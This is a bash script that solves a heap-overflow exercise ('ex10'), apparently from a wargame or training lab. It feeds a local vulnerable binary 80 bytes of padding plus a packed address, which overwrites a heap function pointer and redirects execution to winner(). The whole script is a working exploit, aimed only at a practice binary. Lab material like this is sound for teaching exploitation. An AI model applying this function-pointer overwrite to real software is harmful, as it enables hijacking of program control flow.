#!/usr/bin/env bash
# ex10 — Heap overflow into adjacent function pointer
# Two malloc()'d chunks: data (64 bytes) then fp (4 bytes, holds &nowinner).
# strcpy(data, argv[1]) overflows into fp. Offset data->fp = 80 bytes.
# winner() is at 0x08048464; we write its address over fp.

set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BIN="$SCRIPT_DIR/bin"

[[ -x "$BIN" ]] || { echo "[!] binary not found: $BIN"; exit 1; }

echo "[*] ex10 — heap overflow: overwrite function pointer with &winner"
echo "[*] winner() : $(nm "$BIN" | awk '/ T winner$/{print $1}')"
echo ""

"$BIN" "$(python3 -c "
import sys, struct
sys.stdout.buffer.write(b'A'*80 + struct.pack('<I', 0x08048464))
")"

echo ""
echo "[*] done."
